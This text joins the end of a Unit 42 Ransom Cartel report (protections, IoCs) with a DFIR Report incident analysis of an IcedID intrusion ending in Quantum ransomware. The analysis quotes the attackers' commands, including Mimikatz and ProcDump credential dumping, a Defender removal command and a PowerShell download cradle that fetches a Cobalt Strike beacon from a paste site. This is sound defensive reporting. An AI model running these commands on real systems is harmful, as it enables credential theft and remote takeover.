Cortex XDR: Identifies indicators associated with Ransom Cartel. 
Anti-Ransomware Module to detect Ransom Cartel encryption behaviors on Windows. 
Local Analysis detection for Ransom Cartel binaries on Windows. 
Next-Generation Firewalls:
DNS Signatures detect the known command and control domains, which are also categorized as malware in Advanced URL Filtering. 
If you think you may have been compromised or have an urgent matter, you can get in touch with the Unit 42 Incident Response team or call: North America Toll-Free: 866.486.4842 (866.4.UNIT42) EMEA: +31.20.299.3130 APAC:
+65.6983.8730 Japan: +81.50.1790.0200 Indicators of Compromise Ransom Cartel Samples 9935DA29F3E4E503E4A4712379CCD9963A730CCC304C2FEC31E8276DB35E82E8BF93B029CCA0DE4B6F32E98AEEBD8FD690964816978A0EB13A085A80D4B6BF4E55e4d509de5b0f1ea888ff87eb0d190c328a559d7cc5653c46947e57c0f01ec52411a74b343bbe51b2243985d5edaaabe2ba70e0c923305353037d1f442a91f5 Network-based IoCs 185.239.222[.]240 TOR Exit Node108.62.103[.]193 TOR Exit Node185.129.62[.]62 TOR Exit Node185.143.223[.]13 Bulletproof hosting server185.253.163[.]23 PIA VPN exit node Indicators of compromise and Ransom Cartel-associated TTPs can be found in the Ransom Cartel ATOM. 
Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members.
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
Learn more about the Cyber Threat Alliance. 
Updated Oct. 15, 2002, at 11:15 a.m.
PT. 
Get updates from Palo Alto Networks! 
Sign up to receive the latest news, cyber threat intelligence and research from us 
title: Malicious ISO File Leads to Domain Wide Ransomware -
The DFIR Report url: https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/ IcedID continues to deliver malspam emails to facilitate a compromise.
This case covers the activity from a campaign in late September of 2022.
Post exploitation activities detail some familiar and some new techniques and tooling, which led to domain wide ransomware. 
This case shares similarities of the IcedID campaign detailed by Malware-Traffic-Analysis.net, where the ADGet.exe application was referenced. 
This intrusion began by the execution of IcedID malware contained within an ISO image.
The ISO file was delivered to the victim as part of a malspam campaign.
Delivering payloads using an ISO image is a common technique observed in several prior cases.
This technique has grown in use as threat actors look to evade Mark-of-the-Web controls. 
The ISO image delivered a hidden directory containing a IcedID payload and a batch file.
After being successfully mounted, the end user only sees a malicious LNK file named documents inside the virtual hard drive.
Clicking on the LNK file executes the batch file, which copies the IcedID payload to the user’s AppData\Local\Temp folder and loads it using rundll32.
A scheduled task was created at that time to maintain persistence on this host as well. 
Upon the execution of the IcedID payload, discovery commands using Windows utilities such as net, nltest, and ipconfig were executed to discover domain trusts, domain admins, workstation configuration, etc.
Around 16 hours after the initial execution, the first Cobalt Strike beacon DLL rapuab1.dll was executed from the IcedID malware.
This led to another round of discovery using net followed by AdFind. 
The threat actor installed Atera and Splashtop remote access software via an MSI file named hp.msi.
After that, the threat actors tried a GetSystem privilege escalation technique, which was blocked by antivirus.
The threat actor then proceeded to exploit CVE-2020-1472, aka ZeroLogon.
This was followed by a batch script used to perform DNS lookups on hosts across the environment.
After this, the threat actors began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it via a remote service.
They then repeated the install of the remote access software package. 
Some two hours later, a Cobalt Strike beacon named Nigu.exe was executed.
With this beacon, the threat actors succeeded in elevating to SYSTEM on the beachhead host and proceeded to dump LSASS memory.
Another round of activity took place using system tools, batch files, and Adget.
Several more beacons were also loaded on the host using DLLs and PowerShell. 
At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving lateral to other systems.
They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons.
These actions, however, failed to get a beacon to launch on the domain controller being targeted.
After an hour or so of failures, the threat actors proceeded to RDP to the domain controller.
Once there, they then loaded textbin[.]net, a pastebin style site, to download Cobalt Strike PowerShell code to the host in a file named pon.txt. Trying to execute this locally failed as well, and the threat actor moved on to downloading a variety of beacon executables (e.g. lsass.exe, lsasss.exe, etc.).
These beacons, however, continued to crash and fail to run.
Around an hour after starting the RDP session, the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host and reviewed Group Policy Objects for the domain.
The Cobalt Strike beacons then began to execute successfully on the domain controller.
Now, with Cobalt Strike beacons on the domain controller, the threat actors continued with discovery actions using Invoke-ShareFinder and other PowerShell and system utilities. 
A few hours later, the threat actors installed the RSAT tools onto the beachhead host.
However, they appear to have been unfamiliar with the tools and called up the help menu before using Get-ADComputer to collect the details on hosts in the environment.
Back on the domain controller, ProcDump was used to dump LSASS memory.
The PowerShell command Get-EventLog was then used to collect logon events on all domain administrators in the network. 
The threat actors went quiet for around seven hours.
When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation.
For the next several hours, repeats of previous discovery actions and additional beacons executed using remote WMIC commands, were observed.
During this time, Windows event logs point to the threat actors completing DCSync activities on one of the domain controllers.
A new batch file, localdisk.bat, was also executed using remote WMI commands, to collect disk data on hosts around the environment.
These discovery actions were completed several times again in other various batch files. 
On the start of the fourth day, the threat actors continued to repeat their previous discovery and beacon spreading activity.
Near the end of the day, the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control.
Next, the threat actor executed PowerShell to pop up an alert message on several hosts, letting the user know that the machine was infected with Cobalt Strike. 
After completing this activity, they used Rclone to exfiltrate copies of the backup files to the Mega.io cloud storage service.
The threat actors then staged a ransomware binary named locker_64.exe on the backup server but did not immediately execute it. 
Around two hours after dropping the file, it was executed using a command line argument, which included a list of hosts to target.
This appeared to fail.
The threat actors then proceeded to execute the payload manually in several ways, across various hosts.
Finally, they connected to a domain controller and dropped three scripts; one to copy the ransomware executable to all hosts, one to reset every users password in the organization, and a final one to execute the staged ransomware payload using PsExec. 
Once executed, the ransomware left the ransom note README_TO_DECRYPT.html, which informs the victim that Quantum ransomware is responsible for the intrusion.
The time to ransomware was just over 78 hours from the initial IcedID infection.
All domain joined systems were encrypted with Quantum ransomware. 
Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, etc.
More information on this service can be found here. 
Our All Intel service includes long term infrastructure tracking, clustering, C2 configs, and other curated intel, including non-public case data. 
If you are interested in hearing more about our services, or would like to talk about a free trial, please reach out to us using the Contact Us page.
We look forward to hearing from you. 
Analysts Analysis and reporting completed by @_pete_0 and @MetallicHack. MITRE ATT&CK 
This intrusion began by the execution of a malicious LNK embedded in an ISO file (masquerading as a folder).
The ISO file was delivered as a ZIP archive via a malicious spam mail campaign. 
Malicious ISO file First, the user clicked on the ISO file, which created a new virtual hard drive disk.
Such activity can be tracked with Event 12 from Microsoft-Windows-VHDMP/Operational. 
This ISO file contains a LNK named documents and a hidden directory named max containing a cobalt strike DLL beacon and a batch file. 
As we can see below using LECmd from Eric Zimmerman, the file documents.lnk points to max\eyewear.bat. As a consequence, when the victim clicked on the LNK file, it triggered the execution of the batch file eyewear.bat The batch file eyewear.bat then executed two commands: It first moved a DLL file named eyewear.dat, initially located in a hidden folder named max, to the user’s AppData\Local\Temp\ folder : C:\Windows\system32\cmd.exe /c
D:\max\eyewear.bat ➝ xcopy /s /i
/e /h
max\easygoing.dat C:\Users\[REDACTED]\AppData\Local\Temp\* 
Then, DLL was executed using rundll32.exe : C:\Windows\system32\cmd.exe /c
D:\max\eyewear.bat ➝ rundll32 C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,#1 On the second day of the intrusion, the threat actors used the IcedID malware to drop a Cobalt Strike beacon and executed it using regsvr32.exe. 
After beginning to move laterally, the threat actors used many other execution techniques such as PowerShell and executables run from their interactive RDP session in addition to DLLs. 
A number of application crashes were observed across several compromised hosts.
This activity was a result of the threat actors attempting to execute various dropped tools or beacons on the endpoint, triggering a Windows Error Reporting (WER) fault process. 
Application crashes are recorded in the Windows Application event log under Event ID 1000 and 1001. 
The NSA Cyber Windows Event Monitoring Guidance, has the following statement: Application crashes may warrant investigation to determine if the crash is malicious or benign. 
In this case, the threat actors attempted to rectify the issue by deploying new beacons, renaming executable files by either appending a double extension or adding extra characters to the filename (i.e. lsass.exe to lsasss.exe). 
Some of these crashes may have been in response to being detected by Microsoft Defender.
These signatures were found in the logs on various hosts. 
HackTool:Win32/NamedPipeImpers.
A TrojanDropper:PowerShell/Cobacis.
B VirTool:MSIL/Menace.
C!MTB There was evidence that that the Cobalt Strike aggressor script AnnoyKit was leveraged to launch Internet Explorer via a COM object. 
Decoded from Base64: The decoded PowerShell function is readable in the PowerShell logs: 
The PowerShell script used is publicly available, and can be found here, along with the CNA script. 
We were unable to ascertain the purpose of running this script or how it furthered the threat actor’s goals. 
IcedID created a DLL named Utucka.dll just after the initial execution. 
A scheduled task was then created using this same DLL. 
<?xml version="1.0" encoding="UTF-16"?> <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"> <RegistrationInfo> <URI>\{3A79715D-4FFB-50BE-8F3A-090CE7FB4097}</URI> </RegistrationInfo> <Triggers> <TimeTrigger id="TimeTrigger"> <Repetition> <Interval>PT1H</Interval> <StopAtDurationEnd>false</StopAtDurationEnd> </Repetition> <StartBoundary>2012-01-01T12:00:00</StartBoundary> <Enabled>true</Enabled> </TimeTrigger> <LogonTrigger id="LogonTrigger"> <Enabled>true</Enabled> <UserId>[REDACTED]</UserId> </LogonTrigger> 
</Triggers> <Principals> <Principal id="Author"> <RunLevel>HighestAvailable</RunLevel> <UserId>[REDACTED]</UserId> <LogonType>InteractiveToken</LogonType> </Principal> </Principals> 
<Settings> <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries> <AllowHardTerminate>false</AllowHardTerminate> <StartWhenAvailable>true</StartWhenAvailable> <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> <IdleSettings> <Duration>PT10M</Duration> <WaitTimeout>PT1H</WaitTimeout> <StopOnIdleEnd>true</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle> </IdleSettings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <RunOnlyIfIdle>false</RunOnlyIfIdle> <WakeToRun>false</WakeToRun> <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> <Priority>7</Priority> </Settings> <Actions Context="Author"> <Exec> <Command>rundll32.exe</Command> <Arguments>"C:\Users\[REDACTED]\AppData\Local\[REDACTED]\[REDACTED]\Utucka.dll",#1 --oxoj="CategoryBeyond\license.dat"</Arguments> </Exec> </Actions> </Task> First execution was observed on Day 1 at 8:00 PM and was repeated every hour. 
C:\Windows\system32\svchost.exe -k netsvcs -p -s
Schedule ➝ rundll32.exe
"C:\Users\[REDACTED]\AppData\Local\[REDACTED]\[REDACTED]\Utucka.dll",#1 --oxoj="CategoryBeyond\license.dat" Named pipe impersonation The named pipe impersonation technique was used multiple times on different hosts in order to get system privileges.
This is a common technique used by threat actors, and implemented by the GetSystemCobalt Strike command.
As seen in the screenshot below, GetSystem creates a service and connects to a pipe. 
cmd.exe /c
echo nbproc > \\.\pipe\nbproc cmd.exe /c
echo xgxfpw > \\.\pipe\xgxfpw cmd.exe /c
echo
ylfdup > \\.\pipe\ylfdup 
The beacon creates the named pipe (seen in Sysmon EventID 17) and impersonates the NT AUTHORITY\SYSTEM account used to connect to the pipe. 
The MITRE Cyber Analytics Repository (CAR) details the Get System elevation, CAR-2021-02-002: Get System Elevation Winlogon Token Impersonation/Theft Multiple access to WinLogon with granted access 0x40
(PROCESS_DUP_HANDLE) were performed.
Such access can be tracked with Sysmon event ID 10 (ProcessAccess).
As explained in this blog written by Jonathan JOHNSON, opening a handle to WinLogon in order to duplicate the token and call ImpersonateLoggedOnUser is a known Cobalt Strike technique. 
ZeroLogon On the second day of the intrusion, a spike in NetLogon traffic was observed from the beachhead host to a domain controller.
This traffic then triggered several network signatures for CVE-2020-1472 otherwise known as ZeroLogon. 
ET EXPLOIT Possible Zerologon Phase 1/3 - NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1 ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472) 
The event logs corroborated a successful exploitation with a password update Event 4742 for one of the Domain Controller passwords. 
Mark-of-the-Web Bypass The threat actors delivered the initial malware as a zip file, with the contents of a ISO file, which contained their payload to gain access to the target environment.
These packages are designed to evade controls such as Mark-of-the-Web restrictions. 
Windows Defender tampering On one host, the threat actors ran the following command to try and clear the way for their activity, likely due to the difficulty the threat actors were having with beacons crashing. 
powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI This command was downloaded from a remote site to a file named pon!.txt and then executed locally. 
Process injection Multiple suspicious calls to the function CreateRemoteThread (Sysmon Event ID 8) were observed.
This is a known behavior of Cobalt Strike and its function shinject, which can be used to inject a new beacon or a specific program to another process on the victim’s computer. 
As a result, we observed abnormal winlogon.exe process behavior, winlogon.exe performed DNS requests (Sysmon event ID 22) to a Cobalt Strike C2 domain guteyutu[.]com. 
The injection is also visible from memory dumps.
Several hosts showed rundll32 processes exhibiting common process injection behavior, where the MZ file header is seen in the starting memory address in rundll32 processes with PAGE_EXECUTE_READWRITE permissions. 
Many of these beacons could also be detected in memory scanning with the Malpedia Cobalt Strike rule.
A sample of a scanning run is displayed below: Host Process ID Process Name Command Line Yara Rule SERVERA 568 winlogon.exe winlogon.exe win_cobalt_strike_auto SERVERA 4284 RuntimeBroker.exe C:\Windows\System32\RuntimeBroker.exe -Embedding win_cobalt_strike_auto SERVERB 9936 
rundll32.exe C:\Windows\syswow64\rundll32.exe win_cobalt_strike_auto BEACHHEAD 996 svchost.exe C:\Windows\system32\svchost.exe -k DcomLaunch -p
-s LSM win_cobalt_strike_auto BEACHHEAD 1888 svchost.exe C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
-s AudioEndpointBuilder win_cobalt_strike_auto BEACHHEAD 2220 winlogon.exe winlogon.exe win_cobalt_strike_auto BEACHHEAD 7032 rundll32.exe C:\Windows\syswow64\rundll32.exe win_cobalt_strike_auto SERVERC 3328 
rundll32.exe C:\Windows\syswow64\rundll32.exe win_cobalt_strike_auto Multiple tools and scripts were observed to access and collect credentials from compromised hosts.
There were several variants of Mimikatz in binary and PowerShell form: "C:\ProgramData\mimikatz.exe" "C:\ProgramData\mimikatz.exe.exe" "C:\ProgramData\mimikatz_cryptovanniy.exe" "C:\ProgramData\notepad.exe" "C:\ProgramData\katz.ps1 Commands used to collect credentials and export to text files stored in the C:\ProgramData folder included the following: C:\Windows\system32\cmd.exe /C
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\programdata\mimikatz\creds.txt C:\Windows\system32\cmd.exe /C
mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > "c:\programdata\creds.txt" C:\Windows\system32\cmd.exe powershell -ep bypass -C "import-module .\katz.ps1;Invoke-Katz" > mimi.txt DCSync Credentials were also dumped via DCSync using two compromised high privilege accounts.
The activity was observed in Windows Security Event ID 4662, with known indicators including non-computer based account, an access mask of 0x100, and object IDs. 
1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 - DS-Replication-Get-Changes-All 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 - DS-Replication-Get-Changes DCSync was observed across 12 events, with separate events for each object ID.
It is likely the operator used the Cobalt Strike DCSync command, having observed them already enter this directly in the host OS command shell. 
For additional details, SpecterOps has an article covering the DCSync technique. 
Code injection in LSASS Multiple injections into the LSASS process were observed on multiple hosts. 
Threat actors used the function CreateRemoteThread in order to inject malicious code in LSASS process to access credentials. 
Process dump of the LSASS process was undertaken using the Sysinternals ProcDump utility: This process was invoked by RunDLL32.exe which was an injected Cobalt Strike beacon reaching out to the command and control server at 111.90.143[.]191. 
C:\Windows\SysWOW64\rundll32.exe ➝ c:\windows\temp\procdump64.exe -accepteula -ma lsass.exe fwtsqmfile00.dmp Classic ransomware discovery stages 
A number of familiar discovery techniques were utilized using various OS commands to discover information relating to the user, host, and network configuration.
Standard time discovery, domain trust discovery, workstation configuration discovery, and use of the net command to discover standard accounts and groups were observed. 
From the IcedID malware running via Rundll32, the following LOLBAS commands were observed: rundll32 C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,#1 ➝ nltest /domain_trusts
/all_trusts ➝ nltest /domain_trusts 
➝ net view /all /domain 
➝ net view /all 
➝ net group "Domain Admins" /domain 
➝ cmd.exe /c
chcp >&2 ➝ ipconfig /all 
➝ net config workstation ➝ systeminfo From Nigu.exe (Cobalt Strike beacon), the following LOLBAS commands were observed: "C:\Users\[REDACTED]\AppData\Local\Temp\Nigu.exe" ➝ C:\Windows\system32\cmd.exe /C
net group "domain admins" /domain ➝ C:\Windows\system32\cmd.exe /C
net group "enterprise admins" /domain ➝ C:\Windows\system32\cmd.exe /C
net time ➝ C:\Windows\system32\cmd.exe /C
net user [REDACTED] /domain 
Discovery commands observed from other Cobalt Strike beacons using LOLBAS included: systeminfo netstat -anop tcp cmd.exe /C
%%temp%% cmd.exe /C
hostname cmd.exe /C
nslookup hostname RSAT installation to enumerate domain computers properties 
Following the first discovery stage, the threat actor installed RSAT (Remote Server Administration Tools) on the beachhead host, which contains the ActiveDirectory PowerShell Module. 
rundll32.exe ➝ C:\Windows\system32\cmd.exe /C
powershell.exe Add-WindowsCapability –online –Name “Rsat.
ActiveDirectory.
DS-LDS.Tools~~~~0.0.1.0” ➝ C:\Windows\system32\cmd.exe /C
powershell.exe Import-Module ActiveDirectory 
One interesting fact to notice, the threat actors had to consult the help menu of Get-ADComputer and Export-CSV using Get-Help. 
rundll32.exe ➝ C:\Windows\system32\cmd.exe /C
powershell.exe Get-Help Export-CSV ➝ C:\Windows\system32\cmd.exe /C
powershell.exe Get-Help Get-ADComputer Domain computers’ properties were then enumerated using the Get-ADComputer.
PowerShell cmdlet and names were exported in a CSV file named ADComputers.csv. 
➝ C:\Windows\system32\cmd.exe /C
powershell.exe Get-ADComputer -Filter * -Properties * | Export-CSV "C:\ProgramData\ADComputers.csv" -NoTypeInformation ➝ C:\Windows\system32\cmd.exe /C
powershell.exe Get-ADComputer -Filter * -Properties * | Export-CSV -Path "C:\ProgramData\ADComputers.csv" -NoTypeInformation ➝ C:\Windows\system32\cmd.exe /C
powershell.exe Get-ADComputer -Filter * -Properties * | Export-csv C:\ProgramData\ADComputers.csv -NoTypeInformation ➝ C:\Windows\system32\cmd.exe /C
powershell.exe Get-ADComputer -Identity
[REDACTED] -Properties * ➝ C:\Windows\system32\cmd.exe /C
powershell.exe get-ADcomputer -Filter * | Where-Object {$a=$_.name; $_.DistinguishedName
-ne
"CN=$a,OU=[REDACTED],DC=[REDACTED],DC=[REDACTED]"} | Sort-Object name | Select-Object name | Export-csv
C:\ProgramData\ADComputers.csv -NoTypeInformation 
In addition, threat actors searched for Active Directory related DLLs in other directories: C:\Windows\system32\cmd.exe /C
dir /s
*file/
Microsoft.ActiveDirectory.Management.dll C:\Windows\system32\cmd.exe /C where /r C:\Windows\WinSxS\ *Microsoft.ActiveDirectory.Management.dll* Hands on keyboard! 
We did observe mistakes made by the threat actors during hands-on keyboard activities, these included typos and incorrect use of commands.
An example of an incorrect named command was nslook up (should have been nslookup) that also incorrectly passed the username, instead of the host name. 
C:\Windows\system32\cmd.exe /C nslook up [REDACTED] C:\Windows\system32\cmd.exe /C
nslookup USERFirstName UserLastName Another example, the misspelling of administrators: net group administartors /domain 
Further examples included typos of commands: C:\Windows\system32\cmd.exe /C
net ttime Other operator errors observed included the use of Cobalt Strike commands being passed as a parameter instead of a beacon task. 
The use of DCSync is documented in a previous TheDFIRReport titled ‘Cobalt Strike, a Defender’s Guide During AD enumeration, the operator made use of the PowerShell Get-help cmdlet to troubleshoot the following: powershell.exe Get-Help Export-CSV powershell.exe
Get-Help Get-ADComputer Two file sharing web sites were used to access files, these were dropmefiles[.]com and file[.]io.
Both of these services were accessed on day two from one Domain Controller on the network, with file downloads relating to tooling/scripts.
On day three, a second Domain Controller was observed accessing the dropmefiles[.]com domain. 
Reviewing the WebCacheV01.dat on the domain controllers, reveals more details on the sites loaded, including the files that where downloaded from those sites: The threat actors downloaded the lsass.exe beacon from their attacker hosted infrastructure at 199.127.60[.]117. 
In addition, the threat actors also used Internet Explorer on the domain controller to search Bing. 
This is quite unusual to search directly on the victim’s browser.
The current search results point to how to change the hidden view attribute in file explorer in reference to the ProgramData folder. 
Domain shares discovery with Invoke-ShareFinder Other tools observed in use, included Invoke-ShareFinder, this is a common tool that we frequently encountered in cases for enumerating network shares and identifying data and potential targets.
We have a detailed report covering Invoke-ShareFinder.
In this case, there is a clear indication that the operator launched the Invoke-ShareFinder command via Cobalt Strike, as observed in Event ID 800: Windows Security Logs discovery Once the threat actors had achieved privilege escalation by compromising administrator accounts, an unusual, but interesting discovery technique was observed as seen below. 
C:\Windows\system32\cmd.exe /C
powershell -c "get-eventlog 'Security' | where {$_.Message -like '*<REDACTED>*' -AND 'Source Network Address'} | export-csv c:\windows\temp\events_<REDACTED>.txt" Executing this query would return all events in the Security log that references the specified account and with a source network address.
Events returned would include process creation, logins, etc. 
Its likely that this discovery technique forms an extension of T1033 – System Owner/User Discovery, where the threat actor was leveraging this data source to understand the account pattern of life, any indicators from compromise, and to potentially blend in adversary activities. 
Base64 for the win Other discovery activities observed included a domain host discovery script via PowerShell.
This was double base64 encoded. 
Decoding this revealed another PowerShell Base64 encoded string: 
The -e is short for -EncodedCommand.
The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $.
Refer to the Base64 cheatsheet by Forian Roth here. 
There are many different variations of EncodedCommand, with shorthand and aliases available.
Unit42 (PaloAlto) provides a good article on trends and observations of PowerShell encoded commands: Decoding this again using CyberChef shows the resulting PowerShell script: Lots of custom scripts dropped by threat actors Other tools and scripts were dropped onto one endpoint: 
The ns.bat file contained thousands of nslookup commands with a corresponding hostname from the network, with output appended to a ns.txt file. 
ADGet : An uncommon tool An Active Directory collection tool called ADGet was dropped into a user’s temp folder and executed with an output filename argument.
No file meta data is provided.
Its a simple to use tool, the application is invoked from the command line and passes an output file name to save enumerated AD objects. 
ADGet is an uncommon tool, however, its function is very similar to ADfind–the key difference is that LDAP queries are not passed, they are instead coded into the binary itself. 
The AD objects will be enumerated generating a zip output file containing the following TSV (tab separated files) files if using a default configuration: These files can be viewed with any editor or reader that supports CSV or TSV. 
ADfind: 
While Adget was seen used, prior to that tool being run the threat actors also deployed the tried and true AdFind, which was renamed to find.exe and called using find.bat. Another batch file named ‘AD.bat’ was dropped into the ProgramData folder on one host and used adfind to enumerate AD objects. 
The AD.bat file had the following commands: for /f "delims="
%%
A in ('dir /s /b
%WINDIR%\system32\*htable.xsl') do set "var=%%A" adfind.exe -f (objectcategory=person) > ad_users.txt adfind.exe -f
objectcategory=computer > ad_computers.txt adfind.exe -f
objectcategory=computer -csv name operatingSystem >
ad_computers_enum.txt adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt adfind.exe -subnets -f
(objectCategory=subnet) >
ad_subnets.txt adfind.exe -f "(objectcategory=group)"
> ad_group.txt adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt Interestingly, the first line in the batch file denotes the WMI output configuration in HTML form (from XSL file c:\windows\system32\wbem\en-US\htable.xsl).
The HTML was never used.
Its likely the code was reused from other open source pentest enumerations scripts available, such as: WMIC The use of WMIC was leveraged by a batch file named dS.bat that queried a number of target hosts to determine the host disk drive configuration.
This can be useful to determine drives, including mounted network shares. 
wmic /node:<REDACTED> /user:"<REDACTED>" /password:"<REDACTED>" logicaldisk get caption,description,drivetype,providername,volumename The dS.bat file was executed by the injected Rundll32.exe process. 
During hands-on discovery by the threat actors, the Group Policy was viewed by the Microsoft Management Console application to view Domain Group Policy Objects. 
This can provide useful information concerning any restrictions or configuration settings for hosts on the network. 
WMI Threat actors used the lolbin wmic.exe in order to execute PowerShell Cobalt Strike beacons on multiple workstations and servers.
The payloads were stored on textbin[.]net. 
As we can see above, WmiPrvSe.exe (WMI Provider Host) executed the PowerShell Cobalt Strike beacon on the remote computers. 
Remote Desktop Protocol 
The beacon C:\ProgramData\lsass.exe was used to proxy RDP connections and connect to another computer. 
Proxying RDP traffic via a processes such as a Cobalt Strike beacon reduces the exposure of the threat actor’s own infrastructure, and blends RDP activity to those of internal hosts on the network. 
The use of RDP was extensively used throughout the intrusion, using a variety of processes (beacon injected or standalone). 
The common processes observed were two injected processes, and the Nigu.exe/lsass.exe. 
These processes are unusual for establishing RDP connections.
During these RDP sessions, the threat actors often opened Internet Explorer to download their beacons or commands they wanted to run on lateral hosts.
An example would be pon.txt.
This file was opened during their RDP session and contained the PowerShell commands used to launch a new beacon: "C:\Windows\system32\NOTEPAD.EXE" C:\Users\installer.baywaterschool\Downloads\pon.txt pon.txt contents: powershell iex((new-object net.webclient).downloadstring('https://textbin.net/raw/ls1jhefawt')) 
Remote Service Remote services were also created in order to propagate Cobalt Strike beacons in the network. 
AnyDesk AnyDesk was used to move laterally between a workstation and a backup server as shown below with Sysmon event 3 (Network connection): 
Collection To achieve collection of various directories on multiple hosts, the threat actors used the dir command through the administrative share c$ and redirected the output to a file text named listing.txt. C:\Windows\System32\cmd.exe
/C dir \\[REDACTED HOST]\c$\users >> listing.txt 
In addition, multiple text files were also created to store the output of various discovery commands and scripts. 
C:\ProgramData\qwe3.txt C:\Users\[REDACTED USER]\Downloads\sns.txt C:\Windows\Temp\events_Administrator.text C:\Windows\Temp\events_[REDACTED USER].text C:\Windows\Temp\listing.txt C:\Windows\Temp\ns.txt C:\Windows\Temp\nsserv.txt IcedID The malware configuration: Configuration details: {“Campaign ID”: 2220668032 ,“C2 url”: “alockajilly.com”} Initially the IcedID malware made a connection to 64.227.12[.]180:80 for it’s first call back.
This aligns with the domain present in the malware configuration details. 
After the first call over an unencrypted port, command and control traffic moved over to TLS on port 443.
Connections were made to various IP’s over the length of the intrusion, but two made up the majority of the traffic. 
destination.ip destination.port tls.client.ja3 tls.server.ja3s zeek.ssl.server.name Count 5.196.103.145 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc choifejuce[.]lol 373 5.196.103.145 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc erinindiaka[.]quest 1 46.101.19.119 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc opiransiuera[.]com 278 178.128.85.30 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc zoomersoidfor[.]com 4 5.252.177.10 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc considerf[.]info 1 66.63.188.70 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc antiflamez[.]bar 1 155.138.159.45 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc www[.]onlinecloud[.]cloud 1 IcedID C2 beaconing over the intrusion: Cobalt Strike There were a number of beacons deployed across the environment, over 70 pipes were created.
The beacons used recognizable default Cobalt Strike configurations and attempted to masquerade dropped files as legitimate Microsoft Windows executables.
For example, on one host, we could observe over 20 pipes being created, in a pattern of postex_xxxx or MSSE-xxxx-server. 
When beacons were deployed within the environment, there was a significant increase in outbound network connections to C2 servers.
For example, a beacon injected into a single Rundll32.exe process generated over 10K connections in a three hour window, consistently across two days. 
The threat actors deployed various beacons over the course of the intrusion using different methods including executables, DLLs, and PowerShell beacons. 
Over the length of the intrusion four different Cobalt Strike servers were observed in use.
Some lasted the majority of the intrusion while others only lasted a few days. 
Cobalt Strike SSL characteristics: destination.ip destination.port tls.client.ja3 tls.client.ja3s zeek.ssl.server.name 172.93.181.165 443 a0e9f5d64349fb13191bc781f81f42e1 ae4edc6faf64d08308082ad26be60767 fazehotafa[.]com 45.66.151.109 443 a0e9f5d64349fb13191bc781f81f42e1 ae4edc6faf64d08308082ad26be60767 guteyutur[.]com 111.90.143.191 443 72a589da586844d7f0818ce684948eea ae4edc6faf64d08308082ad26be60767 – 78.128.112.139 443 72a589da586844d7f0818ce684948eea f176ba63b4d68e576b5ba345bec2c7b7 – Analysis of the Nigu.exe binary indicated use of compression and PE loading characteristics, typically observed for Cobalt Strike payload beacon.
Using CAPA, the results listed the following capabilities: Embedded within the binary were strings such as: “inflate 1.2.11 Copyright 1995-2017 Mark Adler”.
